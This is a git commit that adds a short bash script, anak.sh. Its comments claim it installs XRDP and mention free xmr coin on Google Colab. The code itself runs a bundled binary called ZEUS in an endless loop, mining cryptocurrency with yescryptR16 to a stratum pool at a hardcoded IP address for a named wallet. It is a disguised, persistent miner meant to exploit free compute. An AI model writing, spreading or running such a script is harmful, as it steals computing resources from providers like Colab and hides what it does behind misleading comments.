605a7cedaf7bdbc0526655edc60a0478fa29c5a0
renilo <88342640+renilo@users.noreply.github.com>
2022-10-10 21:59:32 +0700

    Create anak.sh

---
+++ anak.sh
@@ -0,0 +1,10 @@
+# /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+
+FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
+while [ 1 ]; do
+"$FOLDER"/ZEUS -a yescryptR16 -o stratum+tcp://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.tes
+sleep 5
+done
